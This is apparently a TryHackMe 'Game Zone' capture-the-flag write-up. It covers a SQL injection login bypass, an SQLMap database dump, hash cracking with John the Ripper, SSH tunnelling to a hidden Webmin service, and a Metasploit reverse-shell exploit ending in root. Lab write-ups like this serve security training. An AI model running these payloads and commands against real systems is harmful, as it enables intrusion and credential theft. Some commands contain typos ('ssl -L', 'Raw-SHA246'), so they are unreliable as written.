# Game Zone
* Exploit SQLi manually and using SQLMap, crack users hashed password, us SSH tunnelling to reveal a hidden service, and use Metasploit payloads to gain root privileges.

## Obtain access via SQLi
* Taget host uses `SELECT * FROM users WHERE username = :username AND password := password` SQL query within login form.
* Manipulate query to login without legitimate credentials.
  * Username = ' or 1=1 -- -
  * Password = blank
* Changes SQL query to `SELECT * FROM users WHERE username =' or 1=1 -- - AND password := password`.
  * "1=1" = true.
  * "-- -" comments out remainder of query.
## Use SQLMap
* SQLMap is popular OSS for automatic SQL injection and database takeover tool.
* Pre-installed on Kali.
* Can be installed from [here](https://github.com/sqlmapproject/sqlmap).
### Use SQLMap to dump entire database
1. Intercept request to game review search feature using BurpSuite.
2. Save request into text file.
```
POST /portal.php HTTP/1.1
Host: 10.10.72.152
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.72.152
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.72.152/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=9h551ujsnetbpkpeam2fsr2ki2
Connection: close

searchitem=test
```
* Pass request into SQLMap to use authenticated user session.
```
sqlmap -r request.txt --dbms=mysql --dump
```
  * `-r` uses intercepted request.
  * `--dbms` tells SQLMap the type of DBMS.
  * `--dump` attempts to output entire database.

## Crack Password with JohnTheRipper (JTR)
* JTR is fast OSS password cracker.
* Preinstalled on Kali.
* Takes wordlist, hashes it with specified algorithm, then compares it to hashed password.
* Hashes cannot be reversed.
* Can only be broken by hash comparison.
#### Use JTR to crach hash gained above
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA246
```
  * `hash.txt` contains list of hashes to crack.
  * `--wordlist` is list to use to find dehashed value.
  * `--format` is hashing algorithm to use.
## Expose Services with Reverse SSH Tunnels
* Reverse SSH port forwarding specifies that given port on remote host should be forwarded to local host and port.
![cYZsC8p](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/46543e83-ed0e-421c-a78c-4e88f5a18315)
* `-L` is local tunnel.
  * Attacker <- target host.
  * Can forward traffic to another host and view it if site is blocked.
    * E.g. imgur blocked at work
```
ssh -L 9000:imgur.com:80 user@example.com
```

    * Browse to "localhost:9000" to load imgur traffic using other server.
* `-R` is remote tunnel.
  * Attacker -> target host.
  * Attacker forwards traffic to target host for others to view.
#### Use ss tool to investigate sockets running on host
```
ss -tulpn
```

| Argument | Description
| --- | ---
| `-t` | Display TCP sockets.
| `-u` | Display UDP sockets.
| `-l` | Display only listening sockets.
| `-p` | Show process using the socket.
| `-n` | Do not resolve service names.

* Service running on port 10000 blocked on attack host via firewall rule from outside.
* Use SSH tunnel on attack host to expose port via target host.
```
ssl -L 10000:localhost:10000 agent47@TARGET_IP
```
* Browse to http://localhost:10000 on attack host to access newly-exposed webserver.
## Privilege Escalation with Metasploit
* Use CMS dashboard version (webmin 1.5.80) to find Metasploit payload to execute against target host.
* [Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/21851) found on Exploit-db.
```
msfconsole
search webmin type:exploit
use exploit/unix/webapp/webmin_show_cgi_exec
set password videogamer124
set rhosts ATTACKER_IP
set username agent47
set ssl no
show payloads
set payload payload/cmd/unix/reverse
set lhost ATTACKER_IP
exploit
```
  * Set RHOSTS to Attack Host due to SSH tunnel created earlier.
  * Set SSL to be false as the SSL tunnel is not running over HTTPS.
```
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.10.174.232:4444 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.10.174.232:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Payload executed successfully
[*] Command: echo cClA4EYV0eVm9IvA;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "cClA4EYV0eVm9IvA\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (10.10.174.232:4444 -> 10.10.72.152:53206) at 2024-02-29 17:40:57 +0000
[*] Session 2 created in the background.
```
```
sessions 1
[*] Starting interaction with 1...

whoami
root
```
* Stabilise shell.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
* Find root flag.
```
cd /
find / -name "root.*" -user root 2>/dev/null
```
